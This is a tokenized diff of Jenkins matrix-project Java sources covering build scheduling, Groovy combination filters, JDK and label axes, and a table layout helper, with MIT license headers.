"<", "MatrixAggregator", ">", "aggregators", ")", "throws", "InterruptedException", ",", "IOException", "{", "for", "(", "MatrixAggregator", "a", ":", "aggregators", ")", "if", "(", "!", "a", ".", "startBuild", "(", "))", "return", "true", ";", "return", "false", ";", "}", "private", "void", "notifyEndBuild", "(", "MatrixRun", "b", ",", "List", "<", "MatrixAggregator", ">", "aggregators", ")", "throws", "InterruptedException", ",", "IOException", "{", "if", "(", "b", "=", "=", "null", ")", "return", ";", "/", "/", "can", "happen", "if", "the", "configuration", "run", "gets", "cancelled", "before", "it", "gets", "started", ".", "for", "(", "MatrixAggregator", "a", ":", "aggregators", ")", "if", "(", "!", "a", ".", "endRun", "(", "b", ")", ")", "throw", "new", "AbortException", "(", ");", "}", "private", "<", "T", ">", "TreeSet", "<", "T", ">", "createTreeSet", "(", "Collection", "<", "T", ">", "items", ",", "Comparator", "<", "T", ">", "sorter", ")", "{", "TreeSet", "<", "T", ">", "r", "=", "new", "TreeSet", "<", "T", ">", "(", "sorter", ")", ";", "r", ".", "addAll", "(", "items", ")", ";", "return", "r", ";", "}", "/", "**", "Function", "to", "start", "schedule", "a", "single", "configuration", "*", "*", "This", "function", "schedule", "a", "build", "of", "a", "configuration", "passing", "all", "of", "the", "Matrixchild", "actions", "*", "that", "are", "present", "in", "the", "parent", "build", ".", "*", "*", "@", "param", "exec", "Matrix", "build", "that", "is", "the", "parent", "of", "the", "configuration", "*", "@", "param", "c", "Configuration", "to", "schedule", "*", "/", "private", "void", "scheduleConfigurationBuild", "(", "MatrixBuildExecution", "exec", ",", "MatrixConfiguration", "c", ")", "{", "MatrixBuild", "build", "=", "exec", ".", "getBuild", "(", ");", "exec", ".", "getListener", "(", ").", "getLogger", "(", ").", "println", "(", "Messages", ".", "MatrixBuild_Triggering", "(", "ModelHyperlinkNote", ".", "encodeTo", "(", "c", ")", "))", ";", "/", "/", "filter", "the", "parent", "actions", "for", "those", "that", "can", "be", "passed", "to", "the", "individual", "jobs", ".", "List", "<", "MatrixChildAction", ">", "childActions", "=", "build", ".", "getActions", "(", "MatrixChildAction", ".", "class", ")", ";", "c", ".", "scheduleBuild", "(", "childActions", ",", "new", "UpstreamCause", "(", "(", "Run", ")", "build", ")", ");", "}", "private", "MatrixRun", "waitForCompletion", "(", "MatrixBuildExecution", "exec", ",", "MatrixConfiguration", "c", ")", "throws", "InterruptedException", ",", "IOException", "{", "BuildListener", "listener", "=", "exec", ".", "getListener", "(", ");", "String", "whyInQueue", "=", "\"", "\";", "long", "startTime", "=", "System", ".", "currentTimeMillis", "(", ");", "/", "/", "wait", "for", "the", "completion", "int", "appearsCancelledCount", "=", "0", ";", "while", "(", "true", ")", "{", "MatrixRun", "b", "=", "c", ".", "getBuildByNumber", "(", "exec", ".", "getBuild", "(", ").", "getNumber", "(", "))", ";", "/", "/", "two", "ways", "to", "get", "beyond", "this", ".", "one", "is", "that", "the", "build", "starts", "and", "gets", "done", ",", "/", "/", "or", "the", "build", "gets", "cancelled", "before", "it", "even", "started", ".", "if", "(", "b", "!", "=", "null", "&", "&", "!", "b", ".", "isBuilding", "(", "))", "{", "Result", "buildResult", "=", "b", ".", "getResult", "(", ");", "if", "(", "buildResult", "!", "=", "null", ")", "return", "b", ";", "}", "Queue", ".", "Item", "qi", "=", "c", ".", "getQueueItem", "(", ");", "if", "(", "b", "=", "=", "null", "&", "&", "qi", "=", "=", "null", ")", "appearsCancelledCount", "+", "+;", "else", "appearsCancelledCount", "=", "0", ";", "if", "(", "appearsCancelledCount", ">", "=", "5", ")", "{", "/", "/", "there", "'", "s", "conceivably", "a", "race", "condition", "in", "computating", "b", "and", "qi", ",", "as", "their", "computation", "/", "/", "are", "not", "synchronized", ".", "There", "are", "indeed", "several", "reports", "of", "Hudson", "incorrectly", "assuming", "/", "/", "builds", "being", "cancelled", ".", "See", "/", "/", "http", ":", "//", "www", ".", "nabble", ".", "com", "/", "Master", "-", "slave", "-", "problem", "-", "tt14710987", ".", "html", "and", "also", "/", "/", "http", ":", "//", "www", ".", "nabble", ".", "com", "/", "Anyone", "-", "using", "-", "AccuRev", "-", "plugin", "-", "-", "tt21634577", ".", "html", "#", "a21671389", "/", "/", "because", "of", "this", ",", "we", "really", "make", "sure", "that", "the", "build", "is", "cancelled", "by", "doing", "this", "5", "/", "/", "times", "over", "5", "seconds", "listener", ".", "getLogger", "(", ").", "println", "(", "Messages", ".", "MatrixBuild_AppearsCancelled", "(", "ModelHyperlinkNote", ".", "encodeTo", "(", "c", ")", "))", ";", "return", "null", ";", "}", "if", "(", "qi", "!", "=", "null", ")", "{", "/", "/", "if", "the", "build", "seems", "to", "be", "stuck", "in", "the", "queue", ",", "display", "why", "String", "why", "=", "qi", ".", "getWhy", "(", ");", "if", "(", "why", "!", "=", "null", "&", "&", "!", "why", ".", "equals", "(", "whyInQueue", ")", "&", "&", "System", ".", "currentTimeMillis", "(", ")-", "startTime", ">", "5000", ")", "{", "listener", ".", "getLogger", "(", ").", "print", "(", "\"", "Configuration", "\"", "+", "ModelHyperlinkNote", ".", "encodeTo", "(", "c", ")", "+\"", "is", "still", "in", "the", "queue", ":", "\"", ");", "qi", ".", "getCauseOfBlockage", "(", ").", "print", "(", "listener", ")", ";", "/", "/", "this", "is", "still", "shown", "on", "the", "same", "line", "whyInQueue", "=", "why", ";", "}", "}", "Thread", ".", "sleep", "(", "1000", ")", ";", "}", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "MatrixExecutionStrategyDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "\"", "Classic", "\"", ";", "}", "}", "}", "@", "@", "-", "1", ",", "136", "+", "0", ",", "0", "@", "@", "package", "hudson", ".", "matrix", ";", "import", "groovy", ".", "lang", ".", "Binding", ";", "import", "groovy", ".", "lang", ".", "GroovyShell", ";", "import", "groovy", ".", "lang", ".", "Script", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "matrix", ".", "Combination", ".", "BooleanCategory", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "model", ".", "ParameterValue", ";", "import", "hudson", ".", "model", ".", "ParametersAction", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "static", "java", ".", "lang", ".", "Boolean", ".", "*;", "/", "**", "*", "Groovy", "filter", "script", "that", "accepts", "or", "rejects", "matrix", "{", "@", "link", "Combination", "}", ".", "*", "*", "Instances", "of", "this", "class", "is", "thread", "unsafe", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "class", "FilterScript", "{", "private", "final", "Script", "script", ";", "FilterScript", "(", "Script", "script", ")", "{", "this", ".", "script", "=", "script", ";", "}", "/", "**", "*", "@", "param", "context", "*", "Variables", "the", "script", "will", "see", ".", "*", "/", "boolean", "evaluate", "(", "Binding", "context", ")", "{", "script", ".", "setBinding", "(", "context", ")", ";", "return", "TRUE", ".", "equals", "(", "script", ".", "run", "(", "))", ";", "}", "/", "**", "*", "Obtains", "a", "number", "N", "such", "that", "\"", "N", "%", "M", "=", "=", "0", "\"", "would", "create", "*", "a", "reasonable", "sparse", "matrix", "for", "integer", "M", ".", "*", "*", "<", "p", ">", "*", "This", "is", "bit", "like", "{", "@", "link", "Combination", "#", "toIndex", "(", "AxisList", ")", "},", "but", "instead", "*", "of", "creating", "a", "continuous", "number", "(", "which", "often", "maps", "different", "*", "values", "of", "the", "same", "axis", "to", "the", "same", "index", "in", "modulo", "N", "residue", "ring", ",", "*", "we", "use", "a", "prime", "number", "P", "as", "the", "base", ".", "I", "think", "this", "guarantees", "the", "uniform", "*", "distribution", "in", "any", "N", "smaller", "than", "2P", "(", "but", "proof", ",", "anyone", "?", ")", "*", "/", "private", "long", "toModuloIndex", "(", "AxisList", "axis", ",", "Combination", "c", ")", "{", "long", "r", "=", "0", ";", "for", "(", "Axis", "a", ":", "axis", ")", "{", "r", "+", "=", "a", ".", "indexOf", "(", "c", ".", "get", "(", "a", ")", ");", "r", "*", "=", "31", ";", "}", "return", "r", ";", "}", "/", "**", "*", "Applies", "the", "filter", "to", "the", "specified", "combination", "in", "the", "context", "of", "{", "@", "code", "context", "}", ".", "*", "/", "public", "boolean", "apply", "(", "MatrixBuildExecution", "context", ",", "Combination", "combination", ")", "{", "return", "apply", "(", "context", ".", "getProject", "(", ").", "getAxes", "(", "),", "combination", ",", "getConfiguredBinding", "(", "context", ")", ");", "}", "/", "*", "package", "*", "/", "boolean", "apply", "(", "AxisList", "axes", ",", "Combination", "c", ",", "Binding", "binding", ")", "{", "for", "(", "Map", ".", "Entry", "<", "String", ",", "String", ">", "e", ":", "c", ".", "entrySet", "(", "))", "binding", ".", "setVariable", "(", "e", ".", "getKey", "(", "),", "e", ".", "getValue", "(", "))", ";", "binding", ".", "setVariable", "(", "\"", "index", "\"", ",", "toModuloIndex", "(", "axes", ",", "c", ")", ");", "binding", ".", "setVariable", "(", "\"", "uniqueId", "\"", ",", "c", ".", "toIndex", "(", "axes", ")", ");", "return", "evaluate", "(", "binding", ")", ";", "}", "private", "Binding", "getConfiguredBinding", "(", "final", "MatrixBuildExecution", "execution", ")", "{", "final", "Binding", "binding", "=", "new", "Binding", "(", ");", "final", "ParametersAction", "parameters", "=", "execution", ".", "getBuild", "(", ").", "getAction", "(", "ParametersAction", ".", "class", ")", ";", "if", "(", "parameters", "=", "=", "null", ")", "return", "binding", ";", "for", "(", "final", "ParameterValue", "pv", ":", "parameters", ")", "{", "if", "(", "pv", "=", "=", "null", ")", "continue", ";", "final", "String", "name", "=", "pv", ".", "getName", "(", ");", "final", "String", "value", "=", "pv", ".", "createVariableResolver", "(", "null", ")", ".", "resolve", "(", "name", ")", ";", "binding", ".", "setVariable", "(", "name", ",", "value", ")", ";", "}", "return", "binding", ";", "}", "public", "static", "FilterScript", "parse", "(", "String", "expression", ")", "{", "return", "parse", "(", "expression", ",", "ACCEPT_ALL", ")", ";", "}", "/", "**", "*", "@", "since", "1", ".", "541", "*", "/", "public", "static", "FilterScript", "parse", "(", "String", "expression", ",", "FilterScript", "defaultScript", ")", "{", "if", "(", "Util", ".", "fixEmptyAndTrim", "(", "expression", ")", "==", "null", ")", "return", "defaultScript", ";", "GroovyShell", "shell", "=", "new", "GroovyShell", "(", ");", "return", "new", "FilterScript", "(", "shell", ".", "parse", "(", "\"", "use", "(", "\"+", "BooleanCategory", ".", "class", ".", "getName", "(", ").", "replace", "(", "'$", "',", "'.", "')", "+\"", ")", "{", "\"+", "expression", "+", "\"}", "\")", ");", "}", "private", "static", "final", "Script", "EMPTY", "=", "new", "Script", "(", ")", "{", "@", "Override", "public", "Object", "run", "(", ")", "{", "return", "true", ";", "}", "}", ";", "/", "**", "*", "Constant", "that", "always", "applies", "to", "any", "combination", ".", "*", "@", "since", "1", ".", "541", "*", "/", "/", "*", "package", "*", "/", "static", "final", "FilterScript", "ACCEPT_ALL", "=", "new", "FilterScript", "(", "EMPTY", ")", "{", "@", "Override", "public", "boolean", "apply", "(", "MatrixBuildExecution", "context", ",", "Combination", "combination", ")", "{", "return", "true", ";", "}", "}", ";", "/", "**", "*", "Constant", "that", "does", "not", "apply", "to", "any", "combination", ".", "*", "@", "since", "1", ".", "541", "*", "/", "/", "*", "package", "*", "/", "static", "final", "FilterScript", "REJECT_ALL", "=", "new", "FilterScript", "(", "EMPTY", ")", "{", "@", "Override", "public", "boolean", "apply", "(", "MatrixBuildExecution", "context", ",", "Combination", "combination", ")", "{", "return", "false", ";", "}", "}", ";", "}", "@", "@", "-", "1", ",", "72", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "{", "@", "link", "Axis", "}", "that", "selects", "available", "JDKs", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "JDKAxis", "extends", "Axis", "{", "/", "**", "*", "JDK", "axis", "was", "used", "to", "be", "stored", "as", "a", "plain", "\"", "Axis", "\"", "with", "the", "name", "\"", "jdk", "\"", ",", "*", "so", "it", "cannot", "be", "configured", "by", "any", "other", "name", ".", "*", "/", "public", "JDKAxis", "(", "List", "<", "String", ">", "values", ")", "{", "super", "(", "\"", "jdk", "\"", ",", "values", ")", ";", "}", "@", "DataBoundConstructor", "public", "JDKAxis", "(", "String", "[", "]", "values", ")", "{", "super", "(", "\"", "jdk", "\"", ",", "Arrays", ".", "asList", "(", "values", ")", ");", "}", "@", "Override", "public", "boolean", "isSystem", "(", ")", "{", "return", "true", ";", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "AxisDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "JDKAxis_DisplayName", "(", ");", "}", "/", "**", "*", "If", "there", "'", "s", "no", "JDK", "configured", ",", "there", "'", "s", "no", "point", "in", "this", "axis", ".", "*", "/", "@", "Override", "public", "boolean", "isInstantiable", "(", ")", "{", "return", "!", "Jenkins", ".", "getInstance", "(", ").", "getJDKs", "(", ").", "isEmpty", "(", ");", "}", "}", "}", "@", "@", "-", "1", ",", "85", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "Functions", ";", "import", "hudson", ".", "Util", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "hudson", ".", "model", ".", "labels", ".", "LabelAtom", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "import", "java", ".", "util", ".", "List", ";", "/", "**", "*", "{", "@", "link", "Axis", "}", "that", "selects", "label", "expressions", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "LabelAxis", "extends", "Axis", "{", "@", "DataBoundConstructor", "public", "LabelAxis", "(", "String", "name", ",", "List", "<", "String", ">", "values", ")", "{", "super", "(", "name", ",", "values", ")", ";", "}", "@", "Override", "public", "boolean", "isSystem", "(", ")", "{", "return", "true", ";", "}", "@", "Override", "public", "String", "getValueString", "(", ")", "{", "return", "Util", ".", "join", "(", "getValues", "(", "),", "\"/", "\")", ";", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "AxisDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "LabelAxis_DisplayName", "(", ");", "}", "/", "**", "*", "If", "there", "'", "s", "no", "distributed", "build", "set", "up", ",", "it", "'", "s", "pointless", "to", "provide", "this", "axis", ".", "*", "/", "@", "Override", "public", "boolean", "isInstantiable", "(", ")", "{", "Jenkins", "h", "=", "Jenkins", ".", "getInstance", "(", ");", "return", "!", "h", ".", "getNodes", "(", ").", "isEmpty", "(", ")", "|", "|", "!", "h", ".", "clouds", ".", "isEmpty", "(", ");", "}", "private", "String", "jsstr", "(", "String", "body", ",", "Object", ".", "..", "args", ")", "{", "return", "'", "\\\"", "'+", "Functions", ".", "jsStringEscape", "(", "String", ".", "format", "(", "body", ",", "args", ")", ")+", "'\\", "\"'", ";", "}", "public", "String", "buildLabelCheckBox", "(", "LabelAtom", "la", ",", "LabelAxis", "instance", ")", "{", "return", "jsstr", "(", "\"<", "input", "type", "=", "'", "checkbox", "'", "name", "=", "'", "values", "'", "json", "=", "'%", "s", "'", "\"", ",", "Functions", ".", "htmlAttributeEscape", "(", "la", ".", "getName", "(", "))", ")", "+", "String", ".", "format", "(", "\"+", "has", "(", "%", "s", ")", "+\"", ",", "jsstr", "(", "la", ".", "getName", "(", "))", ")", "+", "jsstr", "(", "\"/", "><", "label", "class", "=", "'", "attach", "-", "previous", "'", ">%", "s", "(", "%", "s", ")", "</", "label", ">", "\",", "la", ".", "getName", "(", "),", "la", ".", "getDescription", "(", "))", ";", "/", "/", "'", "${", "h", ".", "jsStringEscape", "(", "'<", "input", "type", "=", "\"", "checkbox", "\"", "name", "=", "\"", "values", "\"", "json", "=", "\"'", "+", "h", ".", "htmlAttributeEscape", "(", "l", ".", "name", ")", "+'", "\"", "'", ")}", "'+", "has", "(", "\"$", "{", "h", ".", "jsStringEscape", "(", "l", ".", "name", ")", "}\"", ")+", "'$", "{", "h", ".", "jsStringEscape", "(", "'/", "><", "label", "class", "=", "\"", "attach", "-", "previous", "\"", ">'", "+", "l", ".", "name", "+", "'", "(", "'+", "l", ".", "description", "+", "')", "</", "label", ">", "')", "}'", "}", "}", "}", "@", "@", "-", "1", ",", "97", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2010", ",", "InfraDNA", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "Extension", ";", "import", "hudson", ".", "Util", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "java", ".", "util", ".", "LinkedList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "DataBoundConstructor", ";", "/", "**", "*", "{", "@", "link", "Axis", "}", "that", "selects", "label", "expressions", ".", "*", "*", "@", "since", "1", ".", "403", "*", "/", "public", "class", "LabelExpAxis", "extends", "Axis", "{", "@", "DataBoundConstructor", "public", "LabelExpAxis", "(", "String", "name", ",", "String", "values", ")", "{", "super", "(", "name", ",", "getExprValues", "(", "values", ")", ");", "}", "public", "LabelExpAxis", "(", "String", "name", ",", "List", "<", "String", ">", "values", ")", "{", "super", "(", "name", ",", "values", ")", ";", "}", "@", "Override", "public", "boolean", "isSystem", "(", ")", "{", "return", "true", ";", "}", "@", "Override", "public", "DescriptorImpl", "getDescriptor", "(", ")", "{", "return", "(", "DescriptorImpl", ")", "Jenkins", ".", "getInstance", "(", ").", "getDescriptorOrDie", "(", "getClass", "(", "))", ";", "}", "public", "String", "getValuesString", "(", "){", "StringBuffer", "sb", "=", "new", "StringBuffer", "(", ");", "for", "(", "String", "item", ":", "this", ".", "getValues", "(", "))", "{", "sb", ".", "append", "(", "item", ")", ";", "sb", ".", "append", "(", "\"\\", "n", "\"", ");", "}", "return", "sb", ".", "toString", "(", ");", "}", "@", "Extension", "public", "static", "class", "DescriptorImpl", "extends", "AxisDescriptor", "{", "@", "Override", "public", "String", "getDisplayName", "(", ")", "{", "return", "Messages", ".", "LabelExpAxis_DisplayName", "(", ");", "}", "/", "**", "*", "If", "there", "'", "s", "no", "distributed", "build", "set", "up", ",", "it", "'", "s", "pointless", "to", "provide", "this", "axis", ".", "*", "/", "@", "Override", "public", "boolean", "isInstantiable", "(", ")", "{", "Jenkins", "h", "=", "Jenkins", ".", "getInstance", "(", ");", "return", "!", "h", ".", "getNodes", "(", ").", "isEmpty", "(", ")", "|", "|", "!", "h", ".", "clouds", ".", "isEmpty", "(", ");", "}", "}", "public", "static", "List", "<", "String", ">", "getExprValues", "(", "String", "valuesString", ")", "{", "List", "<", "String", ">", "expressions", "=", "new", "LinkedList", "<", "String", ">", "()", ";", "String", "[", "]", "exprs", "=", "valuesString", ".", "split", "(", "\"\\", "n", "\"", ");", "for", "(", "String", "expr", ":", "exprs", ")", "{", "expressions", ".", "add", "(", "Util", ".", "fixEmptyAndTrim", "(", "expr", ")", ");", "}", "return", "expressions", ";", "}", "}", "@", "@", "-", "1", ",", "225", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "AbstractList", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "HashMap", ";", "/", "**", "*", "Used", "to", "assist", "thegeneration", "of", "config", "table", ".", "*", "*", "<", "p", ">", "*", "{", "@", "link", "Axis", "Axes", "}", "are", "split", "into", "four", "groups", ".", "*", "{", "@", "link", "#", "x", "Ones", "that", "are", "displayed", "as", "columns", "}", ",", "*", "{", "@", "link", "#", "y", "Ones", "that", "are", "displayed", "as", "rows", "}", ",", "*", "{", "@", "link", "#", "z", "Ones", "that", "are", "listed", "as", "bullet", "items", "inside", "table", "cell", "}", ",", "*", "and", "those", "which", "only", "have", "one", "value", ",", "and", "therefore", "doesn", "'", "t", "show", "up", "*", "in", "the", "table", ".", "*", "*", "<", "p", ">", "*", "Because", "of", "object", "reuse", "inside", "{", "@", "link", "Layouter", "}", ",", "this", "class", "is", "not", "thread", "-", "safe", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "abstract", "class", "Layouter", "<", "T", ">", "{", "public", "final", "List", "<", "Axis", ">", "x", ",", "y", ",", "z", ";", "/", "**", "*", "Axes", "that", "only", "have", "one", "value", ".", "*", "/", "private", "final", "List", "<", "Axis", ">", "trivial", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "/", "**", "*", "Number", "of", "data", "columns", "and", "rows", ".", "*", "/", "private", "int", "xSize", ",", "ySize", ",", "zSize", ";", "public", "Layouter", "(", "List", "<", "Axis", ">", "x", ",", "List", "<", "Axis", ">", "y", ",", "List", "<", "Axis", ">", "z", ")", "{", "this", ".", "x", "=", "x", ";", "this", ".", "y", "=", "y", ";", "this", ".", "z", "=", "z", ";", "init", "(", ");", "}", "/", "**", "*", "Automatically", "split", "axes", "to", "x", ",", "y", ",", "and", "z", ".", "*", "/", "public", "Layouter", "(", "AxisList", "axisList", ")", "{", "x", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "y", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "z", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "List", "<", "Axis", ">", "nonTrivialAxes", "=", "new", "ArrayList", "<", "Axis", ">", "()", ";", "for", "(", "Axis", "a", ":", "axisList", ")", "{", "if", "(", "a", ".", "size", "(", ")>", "1", ")", 